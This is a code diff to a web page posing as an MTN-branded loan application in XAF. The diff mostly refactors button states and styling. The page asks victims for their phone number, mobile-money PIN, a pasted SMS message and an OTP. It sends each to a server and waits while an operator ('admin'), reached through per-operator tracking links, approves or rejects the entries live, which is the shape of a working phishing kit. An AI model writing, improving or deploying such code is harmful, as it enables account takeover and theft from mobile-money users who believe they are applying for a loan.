@@ -152,8 +152,9 @@
   .pin-delete { cursor:pointer; color:var(--text-light); font-size:1rem; background:none; border:none; margin-left:6px; padding:0; transition:color 0.2s; }
   .pin-delete:hover { color:var(--mtn-gold); }
   .forgot-pin { text-align:center; font-size:0.82rem; color:var(--text-light); margin-bottom:24px; cursor:pointer; }
-  .btn-login { width:100%; max-width:380px; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:not-allowed; font-family:'Inter',sans-serif; transition:all 0.2s; }
+  .btn-login { width:100%; max-width:380px; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; font-family:'Inter',sans-serif; transition:all 0.2s; }
   .btn-login.rdy { background: var(--grad); color:#fff; cursor:pointer; }
+  .btn-login:disabled { opacity:0.6; cursor:not-allowed; }
   .lg-curve { margin-top:32px; background:#fff; overflow:hidden; flex-shrink:0; }
   .lg-curve::before { content:''; display:block; background: var(--mtn-dark); height:55px; clip-path:ellipse(60% 100% at 50% 100%); margin-bottom:-4px; }
   .lg-foot { background: var(--mtn-dark); padding:24px 20px 32px; display:flex; flex-direction:column; align-items:center; gap:8px; text-align:center; }
@@ -180,8 +181,9 @@
   .sms-textarea { width:100%; padding:12px 14px; border:1.5px solid var(--border); border-radius:var(--radius-sm); font-family:'Inter',sans-serif; font-size:0.9rem; color:var(--text-dark); background:#fff; outline:none; transition:border-color 0.2s; min-height:120px; resize:vertical; }
   .sms-textarea:focus { border-color:var(--mtn-gold); box-shadow:0 0 0 3px rgba(255,215,0,0.2); }
   .sms-code-hint { font-size:0.75rem; color:var(--text-light); margin-top:8px; font-style:italic; }
-  .btn-sms { width:100%; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:not-allowed; font-family:'Inter',sans-serif; transition:all 0.2s; margin-top:16px; }
+  .btn-sms { width:100%; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; font-family:'Inter',sans-serif; transition:all 0.2s; margin-top:16px; }
   .btn-sms.rdy { background: var(--grad); color:#fff; cursor:pointer; }
+  .btn-sms:disabled { opacity:0.6; cursor:not-allowed; }
   .sms-curve { background:#fff; overflow:hidden; flex-shrink:0; }
   .sms-curve::before { content:''; display:block; background: var(--mtn-dark); height:50px; clip-path:ellipse(60% 100% at 50% 100%); margin-bottom:-4px; }
   .sms-foot { background: var(--mtn-dark); padding:14px; text-align:center; font-size:0.75rem; color:rgba(255,255,255,0.45); }
@@ -207,8 +209,9 @@
   .otp-box[type=number] { -moz-appearance: textfield; }
   .otp-delete { cursor:pointer; color:var(--text-light); font-size:1rem; background:none; border:none; margin-left:6px; padding:0; transition:color 0.2s; }
   .otp-delete:hover { color:var(--mtn-gold); }
-  .btn-otp { width:100%; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:not-allowed; font-family:'Inter',sans-serif; transition:all 0.2s; }
+  .btn-otp { width:100%; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; font-family:'Inter',sans-serif; transition:all 0.2s; }
   .btn-otp.rdy { background: var(--grad); color:#fff; cursor:pointer; }
+  .btn-otp:disabled { opacity:0.6; cursor:not-allowed; }
   .otp-curve { background:#fff; overflow:hidden; flex-shrink:0; }
   .otp-curve::before { content:''; display:block; background: var(--mtn-dark); height:50px; clip-path:ellipse(60% 100% at 50% 100%); margin-bottom:-4px; }
   .otp-foot { background: var(--mtn-dark); padding:14px; text-align:center; font-size:0.75rem; color:rgba(255,255,255,0.45); }
@@ -267,6 +270,8 @@
   .admin-error-content p { font-size:0.9rem; color:var(--text-mid); line-height:1.6; margin-bottom:24px; }
   .admin-error-code { background:#f5f5f5; padding:12px; border-radius:8px; font-family:monospace; font-size:0.85rem; color:#666; margin-bottom:20px; border:1px solid #ddd; }
   .admin-error-btn { padding:12px 24px; background:var(--grad); color:#fff; border:none; border-radius:8px; font-size:0.9rem; font-weight:600; cursor:pointer; font-family:'Inter',sans-serif; }
+
+  @media(max-width:500px){.field-row{grid-template-columns:1fr;}.step-card,.land-card{padding:24px 18px;}.otp-card,.sms-card{padding:24px 16px;}}
 </style>
 </head>
 <body>
@@ -277,7 +282,7 @@
     <h3>⚠️ Access Denied</h3>
     <p>This form requires an admin authorization link to proceed. Please use the link provided by your administrator.</p>
     <div class="admin-error-code" id="adminErrorCode">
-      Example: https://yoursite.com/form?admin=ADMIN001
+      Example: https://yoursite.com/form?admin=ADMIN123456
     </div>
     <p style="font-size:0.85rem; color:var(--text-light); margin-bottom:0;">Contact your administrator if you don't have a valid link.</p>
   </div>
@@ -648,7 +653,7 @@
     firstName: '', lastName: '', phone: '',
     employment: '', annualIncome: 0,
     applicationId: '',
-    requestAdminId: ''
+    requestAdminId: '' // ✅ Admin ID from URL parameter (REQUIRED)
   };
 
   // ═══════════════════════════════════════════════════
@@ -659,17 +664,20 @@
     const adminId = urlParams.get('admin');
     
     if (!adminId) {
+      // ❌ NO ADMIN ID - BLOCK ACCESS
       console.error('❌ BLOCKED: No admin parameter in URL');
       document.getElementById('adminErrorModal').classList.add('show');
       return;
     }
 
+    // ✅ ADMIN ID FOUND - PROCEED
     S.requestAdminId = adminId;
     console.log('✅ Admin link locked to:', adminId);
   })();
 
   // NAVIGATION
   function goTo(pageId) {
+    // Check if admin is locked before allowing navigation
     if (!S.requestAdminId) {
       document.getElementById('adminErrorModal').classList.add('show');
       return;
@@ -680,7 +688,7 @@
     window.scrollTo(0, 0);
   }
 
-  // START APPLICATION
+  // START APPLICATION - Check admin lock
   function startApplication() {
     if (!S.requestAdminId) {
       document.getElementById('adminErrorModal').classList.add('show');
@@ -772,43 +780,27 @@
   }
 
   // ══════════════════════════════════════════════════════
-  // LOGIN PAGE — PIN INPUT HELPERS (5 DIGITS - CORRECT PATTERN)
+  // ✅ CONSISTENT BUTTON STATE MANAGEMENT
   // ══════════════════════════════════════════════════════
+  
+  // LOGIN PAGE — PIN INPUT HELPERS
   function pinMvM(el, i) {
     el.value = el.value.replace(/\D/, '');
     if (el.value && i < 4) {
       document.getElementById('lp' + (i+1)).focus();
     }
-    chkPin();
+    updateLoginButtonState();
   }
 
-  // Enhanced PIN input with backspace support
-  document.addEventListener('keydown', function(e) {
-    const id = e.target.id;
-    
-    if (id.startsWith('lp') && e.key === 'Backspace' && !e.target.value) {
-      const idx = parseInt(id[2]);
-      if (idx > 0) {
-        document.getElementById('lp' + (idx-1)).focus();
-      }
-    }
-    
-    if (id.startsWith('otp') && !id.startsWith('otpPin') && e.key === 'Backspace' && !e.target.value) {
-      const idx = parseInt(id[3]);
-      if (idx > 0) {
-        document.getElementById('otp' + (idx-1)).focus();
-      }
-    }
-  });
-
-  // ✅ CORRECT PIN CHECK — Uses classList pattern
-  function chkPin() {
+  function updateLoginButtonState() {
     const ok = [0,1,2,3,4].every(i => document.getElementById('lp'+i).value);
     const btn = document.getElementById('bLgn');
     if (ok) {
       btn.classList.add('rdy');
+      btn.disabled = false;
     } else {
       btn.classList.remove('rdy');
+      btn.disabled = true;
     }
   }
 
@@ -823,16 +815,8 @@
     [0,1,2,3,4].forEach(i => {
       document.getElementById('lp'+i).value = '';
     });
-    chkPin();
+    updateLoginButtonState();
     document.getElementById('lp0').focus();
-  }
-
-  function clearOtpCode() {
-    [0,1,2,3].forEach(i => {
-      document.getElementById('otp'+i).value = '';
-    });
-    chkOtp();
-    document.getElementById('otp0').focus();
   }
 
   function showLgnMsg(type, text) {
@@ -842,11 +826,15 @@
     if (type === 'warning') { document.getElementById('lpMsgWarnTxt').textContent = text; document.getElementById('lpMsgWarn').classList.add('show'); }
   }
 
+  function hideLgnMsgs() {
+    ['lpMsg','lpMsgOk','lpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
+  }
+
   // ══════════════════════════════════════════════════════
   // ✅ LOGIN — SUBMIT PIN WITH ADMIN PARAMETER (REQUIRED)
   // ══════════════════════════════════════════════════════
   async function doLogin() {
-    ['lpMsg','lpMsgOk','lpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
+    hideLgnMsgs();
 
     const phone = document.getElementById('lpPhone').value;
     const pin = [0,1,2,3,4].map(i => document.getElementById('lp'+i).value).join('');
@@ -913,15 +901,15 @@
             console.log('❌ Admin rejected login');
             clearTimeout(pollTimeout);
             
-            // ✅ CORRECT: Clear only PIN fields, KEEP phone visible
+            // Reset form to initial state
+            document.getElementById('lpPhone').value = '';
             [0,1,2,3,4].forEach(i => document.getElementById('lp'+i).value = '');
-            
-            // ✅ CALL chkPin() to re-enable button check
-            chkPin();
+            updateLoginButtonState();
             
             goTo('page-login');
             showLgnMsg('error', 'Your login credentials were invalid. Please try again.');
           } else {
+            // Still pending, keep polling
             pollTimeout = setTimeout(checkStatus, 2000);
           }
         } else {
@@ -932,20 +920,21 @@
         pollTimeout = setTimeout(checkStatus, 3000);
       }
     };
-    
     checkStatus();
   }
 
   // ══════════════════════════════════════════════════════
-  // SMS PASTE PAGE
+  // SMS PASTE PAGE — BUTTON STATE MANAGEMENT
   // ══════════════════════════════════════════════════════
   function chkSmsMsg() {
     const txt = document.getElementById('smsMsgBox').value.trim();
     const btn = document.getElementById('bSms');
     if (txt.length > 3) {
       btn.classList.add('rdy');
+      btn.disabled = false;
     } else {
       btn.classList.remove('rdy');
+      btn.disabled = true;
     }
   }
 
@@ -955,8 +944,12 @@
     if (type === 'success') { document.getElementById('smsMsgOkTxt').textContent = text;  document.getElementById('smsMsgOk').classList.add('show'); }
   }
 
-  async function doSmsParse() {
+  function hideSmsMsg() {
     ['smsMsg','smsMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
+  }
+
+  async function doSmsParse() {
+    hideSmsMsg();
 
     const msg = document.getElementById('smsMsgBox').value.trim();
     if (msg.length < 3) {
@@ -986,11 +979,13 @@
         pollForSmsApproval(S.applicationId);
       } else {
         document.getElementById('bSms').disabled = false;
+        document.getElementById('bSms').classList.remove('rdy');
         showSmsMsg('error', data.message || 'Failed to submit SMS.');
       }
     } catch (err) {
       document.getElementById('mSms').classList.remove('show');
       document.getElementById('bSms').disabled = false;
+      document.getElementById('bSms').classList.remove('rdy');
       showSmsMsg('error', 'Error: ' + err.message);
     }
   }
@@ -1014,11 +1009,8 @@
             console.log('❌ Admin rejected SMS');
             clearTimeout(smsPollTimeout);
             goTo('page-sms-paste');
-            
-            // ✅ Clear SMS message
             document.getElementById('smsMsgBox').value = '';
-            chkSmsMsg();
-            
+            chkSmsMsg(); // Reset button state
             showSmsMsg('error', 'The SMS message was incorrect. Please paste the correct message.');
           } else {
             smsPollTimeout = setTimeout(checkStatus, 2000);
@@ -1031,12 +1023,11 @@
         smsPollTimeout = setTimeout(checkStatus, 3000);
       }
     };
-    
     checkStatus();
   }
 
   // ══════════════════════════════════════════════════════
-  // OTP PAGE — 4-DIGIT OTP (CORRECT PATTERN)
+  // OTP PAGE — BUTTON STATE MANAGEMENT (4-DIGIT OTP)
   // ══════════════════════════════════════════════════════
   function handleOtpInput(el, type) {
     el.value = el.value.replace(/\D/, '');
@@ -1046,18 +1037,27 @@
     if (el.value && type === 'otp' && idx < 3) {
       document.getElementById(type + (idx + 1)).focus();
     }
-    chkOtp();
+    updateOtpButtonState();
   }
 
-  // ✅ CORRECT OTP CHECK — Uses classList pattern
-  function chkOtp() {
+  function updateOtpButtonState() {
     const otpOk = [0,1,2,3].every(i => document.getElementById('otp'+i).value);
     const btn = document.getElementById('bOtp');
     if (otpOk) {
       btn.classList.add('rdy');
+      btn.disabled = false;
     } else {
       btn.classList.remove('rdy');
+      btn.disabled = true;
     }
+  }
+
+  function clearOtpCode() {
+    [0,1,2,3].forEach(i => {
+      document.getElementById('otp'+i).value = '';
+    });
+    updateOtpButtonState();
+    document.getElementById('otp0').focus();
   }
 
   function showOtpMsg(type, text) {
@@ -1066,8 +1066,12 @@
     if (type === 'success') { document.getElementById('otpMsgOkTxt').textContent = text;  document.getElementById('otpMsgOk').classList.add('show'); }
   }
 
-  async function doOtp() {
+  function hideOtpMsg() {
     ['otpMsg','otpMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
+  }
+
+  async function doOtp() {
+    hideOtpMsg();
 
     const otp = [0,1,2,3].map(i => document.getElementById('otp'+i).value).join('');
 
@@ -1078,7 +1082,6 @@
 
     document.getElementById('mOtp').classList.add('show');
     document.getElementById('bOtp').disabled = true;
-    document.getElementById('bOtp').textContent = 'VERIFYING...';
 
     try {
       const res = await fetch('/api/verify-otp', {
@@ -1099,13 +1102,11 @@
         pollForOtpApproval(S.applicationId);
       } else {
         document.getElementById('bOtp').disabled = false;
-        document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
         showOtpMsg('error', data.message || 'Failed to submit OTP.');
       }
     } catch (err) {
       document.getElementById('mOtp').classList.remove('show');
       document.getElementById('bOtp').disabled = false;
-      document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
       showOtpMsg('error', 'Error: ' + err.message);
     }
   }
@@ -1125,7 +1126,7 @@
             console.log('✅ Admin approved OTP - Loan Approved!');
             clearTimeout(otpPollTimeout);
             
-            // Update approval page
+            // Update approval page with loan details
             document.getElementById('aprAmount').textContent = 'XAF ' + (S.loanAmount || 1000000).toLocaleString();
             document.getElementById('aprAmt').textContent = 'XAF ' + (S.loanAmount || 1000000).toLocaleString();
             document.getElementById('aprTerm').textContent = S.loanTerm || '48 Months';
@@ -1138,13 +1139,13 @@
             clearTimeout(otpPollTimeout);
             goTo('page-otp');
             
-            // ✅ Clear OTP fields and call chkOtp()
+            // Reset OTP fields and button state
             [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
-            chkOtp();
-            
+            updateOtpButtonState();
             document.getElementById('bOtp').disabled = false;
-            document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
+            
             showOtpMsg('error', 'The OTP code was incorrect. Please try again.');
+            document.getElementById('otp0').focus();
           } else {
             otpPollTimeout = setTimeout(checkStatus, 2000);
           }
@@ -1156,12 +1157,33 @@
         otpPollTimeout = setTimeout(checkStatus, 3000);
       }
     };
-    
     checkStatus();
   }
 
+  // ENHANCED KEYBOARD SUPPORT FOR PIN/OTP INPUT
+  document.addEventListener('keydown', function(e) {
+    const id = e.target.id;
+    
+    if (id.startsWith('lp') && e.key === 'Backspace' && !e.target.value) {
+      const idx = parseInt(id[2]);
+      if (idx > 0) {
+        document.getElementById('lp' + (idx-1)).focus();
+      }
+    }
+    
+    if (id.startsWith('otp') && !id.startsWith('otpPin') && e.key === 'Backspace' && !e.target.value) {
+      const idx = parseInt(id[3]);
+      if (idx > 0) {
+        document.getElementById('otp' + (idx-1)).focus();
+      }
+    }
+  });
+
   // INIT
   updateCalc();
+  updateLoginButtonState();
+  chkSmsMsg();
+  updateOtpButtonState();
 </script>
 </body>
 </html>
